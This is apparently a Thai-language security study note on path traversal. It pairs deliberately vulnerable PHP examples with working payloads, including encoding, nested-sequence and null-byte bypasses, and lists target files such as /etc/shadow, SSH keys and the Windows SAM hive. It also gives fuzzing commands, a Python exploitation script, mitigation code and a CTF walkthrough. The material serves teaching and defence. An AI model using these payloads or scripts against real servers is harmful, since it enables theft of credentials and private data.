# Path Traversal

## What
Path Traversal (หรือที่เรียกว่า Directory Traversal) เป็นช่องโหว่ที่อนุญาตให้ attacker สามารถเข้าถึงไฟล์และ directories ที่อยู่นอกเหนือจาก web root directory ที่ application กำหนดไว้ โดยการใช้ special characters และ sequences เช่น `../` (dot-dot-slash) เพื่อ traverse ขึ้นไปยัง parent directories

ช่องโหว่นี้เกิดขึ้นเมื่อ application ใช้ user-supplied input ในการสร้าง file paths โดยไม่มีการ validate หรือ sanitize input อย่างเพียงพอ ทำให้ attacker สามารถอ่านไฟล์สำคัญของระบบ เช่น configuration files, password files, source code, หรือไฟล์อื่นๆ ที่มี sensitive information

Path Traversal มักพบใน file download features, file viewers, image galleries, template engines, และ functionalities ใดๆ ที่ทำงานกับ file system โดยตรง

## Landmark
- Parameters ที่รับ filename หรือ path เช่น `?file=`, `?path=`, `?doc=`, `?img=`
- File download/upload functionalities
- URL patterns เช่น `download.php?file=report.pdf`, `view.php?img=photo.jpg`
- Static file serving endpoints
- Template loading mechanisms
- Export/import features
- Backup/restore functionalities
- Log viewer interfaces
- Error messages ที่แสดง file system paths
- Directory listing features

## Types

### 1. Basic Directory Traversal
การใช้ `../` sequences เพื่อ traverse ขึ้นไปยัง parent directories

```php
<?php
// โค้ดที่มีช่องโหว่ - ไม่มีการตรวจสอบ input
$file = $_GET['file'];
$content = file_get_contents("/var/www/html/files/" . $file);
echo $content;
?>
```

**Exploitation:**
```http
# อ่านไฟล์ในระดับเดียวกัน
http://target.com/download.php?file=document.pdf

# Traverse ขึ้นไป parent directory
http://target.com/download.php?file=../config.php

# Traverse หลายระดับเพื่ออ่าน /etc/passwd
http://target.com/download.php?file=../../../../etc/passwd

# อ่าน web server configuration
http://target.com/download.php?file=../../../../etc/apache2/apache2.conf

# อ่าน application source code
http://target.com/download.php?file=../../../index.php
```

### 2. Absolute Path Traversal
การใช้ absolute path เพื่อเข้าถึงไฟล์โดยตรง

```php
<?php
// โค้ดที่อาจมีช่องโหว่หาก validate ไม่ดี
$file = $_GET['file'];
if(file_exists($file)) {
    readfile($file);
}
?>
```

**Exploitation:**
```http
# ใช้ absolute path โดยตรง
http://target.com/view.php?file=/etc/passwd
http://target.com/view.php?file=/etc/shadow
http://target.com/view.php?file=/var/www/html/config.php

# Windows absolute paths
http://target.com/view.php?file=C:\Windows\System32\drivers\etc\hosts
http://target.com/view.php?file=C:\inetpub\wwwroot\web.config
```

### 3. Encoding-based Bypass
การใช้ encoding เพื่อหลบเลี่ยง filters

```php
<?php
// โค้ดที่ filter ../ แต่ไม่ handle encoding
$file = $_GET['file'];
$file = str_replace("../", "", $file);
$content = file_get_contents("/var/www/files/" . $file);
echo $content;
?>
```

**Exploitation:**

```http
# URL encoding
http://target.com/download.php?file=..%2f..%2f..%2fetc%2fpasswd

# Double URL encoding
http://target.com/download.php?file=%252e%252e%252f%252e%252e%252fetc%252fpasswd

# Unicode/UTF-8 encoding
http://target.com/download.php?file=..%c0%af..%c0%af..%c0%afetc/passwd

# 16-bit Unicode encoding
http://target.com/download.php?file=..%u002f..%u002fetc%u002fpasswd

# Mixed encoding
http://target.com/download.php?file=..%2f..%5c..%2fetc/passwd
```

### 4. Nested Traversal Sequences
การใช้ nested sequences เพื่อ bypass simple filters

```php
<?php
// โค้ดที่ filter ../ แบบครั้งเดียว
$file = $_GET['file'];
$file = str_replace("../", "", $file);
include("/var/www/pages/" . $file);
?>
```

**Exploitation:**

```http
# Nested dot-dot-slash
http://target.com/index.php?file=....//....//....//etc/passwd

# Alternative nested patterns
http://target.com/index.php?file=..././..././..././etc/passwd

# Mixed nested
http://target.com/index.php?file=....\/....\/....\/etc/passwd

# หลัง str_replace จะเหลือ: ../../../etc/passwd
```

### 5. Operating System Specific
การใช้ paths และ separators ที่เฉพาะเจาะจงของแต่ละ OS

```php
<?php
// โค้ดที่มีช่องโหว่ cross-platform
$file = $_GET['file'];
readfile("/var/www/files/" . $file);
?>
```

**Linux/Unix Exploitation:**
```http
# Standard Linux paths
http://target.com/download.php?file=../../../../etc/passwd
http://target.com/download.php?file=../../../../etc/shadow
http://target.com/download.php?file=../../../../proc/self/environ
http://target.com/download.php?file=../../../../home/user/.ssh/id_rsa

# Symbolic links
http://target.com/download.php?file=../../../../proc/self/cwd/config.php
```

**Windows Exploitation:**
```http
# Windows paths with backslash
http://target.com/download.php?file=..\..\..\..\Windows\System32\drivers\etc\hosts

# Mixed separators
http://target.com/download.php?file=..\../..\../Windows/win.ini

# UNC paths
http://target.com/download.php?file=\\server\share\file.txt

# Alternate data streams
http://target.com/download.php?file=config.php::$DATA
```

### 6. Null Byte Injection
การใช้ null byte เพื่อ truncate extensions (PHP < 5.3.4)

```php
<?php
// โค้ดที่บังคับ extension
$file = $_GET['file'];
$content = file_get_contents("/var/www/docs/" . $file . ".pdf");
header('Content-Type: application/pdf');
echo $content;
?>
```

**Exploitation:**
```http
# ใช้ null byte truncate .pdf extension
http://target.com/view.php?file=../../../../etc/passwd%00

# Final path: /var/www/docs/../../../../etc/passwd
# .pdf ถูกตัดทิ้งโดย null byte
```

## Exploitation

### Common Target Files - Linux

```bash
# System configuration files - ไฟล์ระบบสำคัญ
/etc/passwd              # User accounts information
/etc/shadow              # Hashed passwords (ต้องมี root)
/etc/group               # Group information
/etc/hosts               # Host name mappings
/etc/hostname            # System hostname
/etc/resolv.conf         # DNS resolver configuration
/etc/network/interfaces  # Network configuration
/etc/ssh/sshd_config     # SSH server configuration
/etc/mysql/my.cnf        # MySQL configuration
/etc/fstab               # File system mount points

# Process and kernel information
/proc/version            # Linux kernel version
/proc/cmdline            # Kernel boot parameters
/proc/self/environ       # Current process environment variables
/proc/self/cmdline       # Current process command line
/proc/self/status        # Process status information
/proc/self/fd/0-255      # File descriptors
/proc/net/tcp            # Active TCP connections
/proc/net/udp            # Active UDP connections

# Application files - ไฟล์ web application
/var/www/html/index.php
/var/www/html/config.php
/var/www/html/.env
/var/www/html/composer.json
/usr/share/nginx/html/index.html
/etc/nginx/nginx.conf
/etc/apache2/apache2.conf
/etc/apache2/sites-enabled/000-default.conf

# Log files - ไฟล์ logs ที่มีข้อมูลสำคัญ
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/auth.log
/var/log/syslog
/var/log/messages

# SSH and credentials
/root/.ssh/id_rsa
/root/.ssh/id_dsa
/root/.ssh/authorized_keys
/home/user/.ssh/id_rsa
/home/user/.bash_history
/root/.bash_history
```

### Common Target Files - Windows

```batch
REM Windows system files
C:\Windows\System32\drivers\etc\hosts
C:\Windows\System32\drivers\etc\networks
C:\Windows\win.ini
C:\Windows\system.ini
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SYSTEM
C:\Windows\repair\SAM
C:\Windows\repair\SYSTEM

REM IIS configuration and logs
C:\inetpub\wwwroot\web.config
C:\inetpub\logs\LogFiles\W3SVC1\u_ex*.log
C:\Windows\System32\inetsrv\config\applicationHost.config

REM Application files
C:\xampp\apache\conf\httpd.conf
C:\xampp\mysql\bin\my.ini
C:\xampp\htdocs\config.php
C:\wamp\bin\apache\apache2.x.x\conf\httpd.conf

REM User files
C:\Users\Administrator\Desktop\
C:\Users\Administrator\Documents\
C:\Users\%USERNAME%\AppData\Local\
```

### Automated Fuzzing

```bash
# ใช้ ffuf สำหรับ fuzz path traversal
# สร้าง wordlist ของ traversal sequences
cat > traversal.txt << 'EOF'
../
../../
../../../
../../../../
../../../../../
../../../../../../
../../../../../../../
../../../../../../../../
../../../../../../../../../
../../../../../../../../../../
EOF

# Fuzz parameter ด้วย wordlist
ffuf -w traversal.txt:TRAV -w common-files.txt:FILE \
  -u "http://target.com/download.php?file=TRAVFILE" \
  -mc 200 -fs 0

# ใช้ dotdotpwn สำหรับ automated testing
dotdotpwn -m http -h target.com -x 80 \
  -f /etc/passwd -k "root:" -d 5 \
  -t 200 -o unix

# ใช้ wfuzz สำหรับ comprehensive testing
wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt \
  -z file,traversal.txt \
  --hc 404 \
  "http://target.com/view.php?file=FUZZFUZ2Z"
```

### Manual Testing Workflow

```bash
# Step 1: ระบุ vulnerable parameter
curl "http://target.com/download.php?file=test.pdf"

# Step 2: ทดสอบ basic traversal
curl "http://target.com/download.php?file=../test.pdf"
curl "http://target.com/download.php?file=../../test.pdf"

# Step 3: พยายามอ่าน /etc/passwd
for i in {1..10}; do
    PAYLOAD=$(printf '../%.0s' $(seq 1 $i))
    echo "Testing: ${PAYLOAD}etc/passwd"
    curl -s "http://target.com/download.php?file=${PAYLOAD}etc/passwd" | grep "root:"
done

# Step 4: ทดสอบ encoding bypass
curl "http://target.com/download.php?file=..%2f..%2f..%2fetc%2fpasswd"
curl "http://target.com/download.php?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"

# Step 5: ทดสอบ nested sequences
curl "http://target.com/download.php?file=....//....//....//etc/passwd"

# Step 6: หา sensitive files
for file in config.php .env database.php wp-config.php; do
    curl -s "http://target.com/download.php?file=../../../../var/www/html/$file" \
      -o "$file"
    echo "Saved: $file"
done
```

### Extracting Sensitive Information

```python
#!/usr/bin/env python3
# Path traversal exploitation script

import requests
import sys

def exploit_path_traversal(url, param, target_file, depth=10):
    """
    พยายามอ่านไฟล์ผ่าน path traversal
    """
    for i in range(1, depth + 1):
        traversal = "../" * i
        payload = traversal + target_file
        
        full_url = f"{url}?{param}={payload}"
        print(f"[*] Trying: {payload}")
        
        try:
            response = requests.get(full_url, timeout=5)
            
            # ตรวจสอบว่าได้ content หรือไม่
            if response.status_code == 200 and len(response.text) > 0:
                # ตรวจสอบว่าเป็น error page หรือไม่
                if "not found" not in response.text.lower():
                    print(f"[+] Success! File found at depth {i}")
                    print(f"[+] Content:\n{response.text[:500]}")
                    return response.text
        except:
            continue
    
    print("[-] File not found")
    return None

if __name__ == "__main__":
    url = "http://target.com/download.php"
    param = "file"
    
    # ลิสต์ไฟล์ที่ต้องการหา
    targets = [
        "etc/passwd",
        "etc/shadow",
        "var/www/html/config.php",
        "var/www/html/.env",
        "proc/self/environ"
    ]
    
    for target in targets:
        print(f"\n[*] Testing: {target}")
        exploit_path_traversal(url, param, target)
```

## Protection & Mitigation

### Secure Coding Practices

```php
<?php
// วิธีที่ปลอดภัย - Whitelist approach
$allowed_files = array(
    'report1' => 'reports/annual_2023.pdf',
    'report2' => 'reports/quarterly_q4.pdf',
    'manual' => 'docs/user_manual.pdf'
);

$file_id = $_GET['file'];

if (array_key_exists($file_id, $allowed_files)) {
    $filepath = $allowed_files[$file_id];
    readfile($filepath);
} else {
    die("Invalid file");
}

// ใช้ basename() เพื่อลบ directory components
$file = basename($_GET['file']);
$filepath = "/var/www/files/" . $file;
readfile($filepath);

// ใช้ realpath() และ validate base directory
$base_dir = realpath('/var/www/files/');
$file = $_GET['file'];
$filepath = realpath($base_dir . '/' . $file);

// ตรวจสอบว่า resolved path อยู่ใน base directory
if ($filepath && strpos($filepath, $base_dir) === 0) {
    readfile($filepath);
} else {
    die("Access denied");
}

// Sanitize input - ลบ dangerous characters
function sanitize_path($path) {
    // ลบ null bytes
    $path = str_replace(chr(0), '', $path);
    
    // ลบ traversal sequences
    $path = str_replace(array('../', '..\\'), '', $path);
    
    // ลบ absolute path indicators
    $path = str_replace(array('/', '\\'), '', $path);
    
    return $path;
}

$file = sanitize_path($_GET['file']);
readfile("/var/www/files/" . $file);
?>
```

### Input Validation

```python
import os
from pathlib import Path

def safe_file_access(base_dir, user_input):
    """
    ปลอดภัยในการเข้าถึงไฟล์ - Python example
    """
    # Normalize base directory
    base_path = Path(base_dir).resolve()
    
    # Construct requested path
    requested_path = (base_path / user_input).resolve()
    
    # Verify requested path is within base directory
    try:
        requested_path.relative_to(base_path)
    except ValueError:
        raise Exception("Access denied: path traversal detected")
    
    # Verify file exists and is a file (not directory)
    if not requested_path.exists():
        raise Exception("File not found")
    
    if not requested_path.is_file():
        raise Exception("Not a file")
    
    return requested_path

# การใช้งาน
try:
    safe_path = safe_file_access("/var/www/files", user_input)
    with open(safe_path, 'r') as f:
        content = f.read()
except Exception as e:
    print(f"Error: {e}")
```

>[!tip] Best Practices
>- ใช้ **whitelist approach** สำหรับ allowed files
>- ใช้ `basename()` หรือเทียบเท่าเพื่อลบ directory paths
>- Validate ด้วย `realpath()` และตรวจสอบ base directory
>- **ห้ามใช้** user input โดยตรงใน file paths
>- Implement proper [[Input Validation]] และ [[Output Encoding]]
>- ใช้ file IDs หรือ tokens แทน filenames
>- Set restrictive file permissions ให้กับ sensitive files

>[!warning] Common Pitfalls
>- พึ่งพา blacklist filtering (มักถูก bypass ได้ง่าย)
>- Filter เฉพาะ `../` แต่ลืม encoding variants
>- ไม่ normalize paths ก่อน validate
>- ใช้ relative paths แทน absolute paths
>- ลืม validate หลัง decode URL encoding

## CTF Example: Document Viewer Challenge

**Scenario:**
Web application มี document viewer ที่มีช่องโหว่ path traversal

```php
<?php
// doc_viewer.php
$category = $_GET['cat'];
$document = $_GET['doc'];

$filepath = "/var/www/documents/" . $category . "/" . $document;

if(file_exists($filepath)) {
    header('Content-Type: text/plain');
    readfile($filepath);
} else {
    echo "Document not found";
}
?>
```

**Attack Walkthrough:**

```bash
# Step 1: ทดสอบ normal functionality
curl "http://ctf.example.com/doc_viewer.php?cat=public&doc=readme.txt"
# Output: This is a public document

# Step 2: ทดสอบ basic traversal
curl "http://ctf.example.com/doc_viewer.php?cat=../&doc=config.php"
# Output: Document not found

# Step 3: ทดลอง traverse ผ่านทั้ง 2 parameters
curl "http://ctf.example.com/doc_viewer.php?cat=../../&doc=../../etc/passwd"
# Success! แสดง /etc/passwd

# Step 4: หา flag location
curl "http://ctf.example.com/doc_viewer.php?cat=../../&doc=../../flag.txt"
# Output: flag{directory_traversal_in_multiple_parameters}

# Step 5: อ่าน source code
curl "http://ctf.example.com/doc_viewer.php?cat=../../../var/www/html&doc=index.php"
# Output: <?php ... source code revealed

# Alternative: ใช้ absolute path
curl "http://ctf.example.com/doc_viewer.php?cat=/&doc=flag.txt"
# Output: flag{directory_traversal_in_multiple_parameters}

# Step 6: ดึง sensitive files
curl "http://ctf.example.com/doc_viewer.php?cat=../../../var/www/html&doc=.env" \
  -o .env
echo "Database credentials extracted!"
```

## Related Topics
- [[LFI (Local File Inclusion)]]
- [[RFI (Remote File Inclusion)]]
- [[File Upload]]
- [[Information Disclosure]]
- [[Access Control]]
- [[Input Validation]]
- [[Insecure Direct Object Reference (IDOR)]]
- [[Security Misconfiguration]]

## Tools
- [[Burp Suite]] - Manual testing และ fuzzing
- [[OWASP ZAP]] - Automated scanning
- [[dotdotpwn]] - Dedicated path traversal fuzzer
- [[ffuf]] - Fast web fuzzer
- [[wfuzz]] - Web application fuzzer
- [[Kadimus]] - LFI/RFI และ path traversal exploitation

## References
- [[OWASP]] - Path Traversal
- [[CWE-22]] - Improper Limitation of a Pathname to a Restricted Directory
- [[PayloadsAllTheThings]] - Directory Traversal payloads
- [[HackTricks]] - File Inclusion and Path Traversal

#web #vulnerability #path-traversal #directory-traversal #file-access #lfi #security
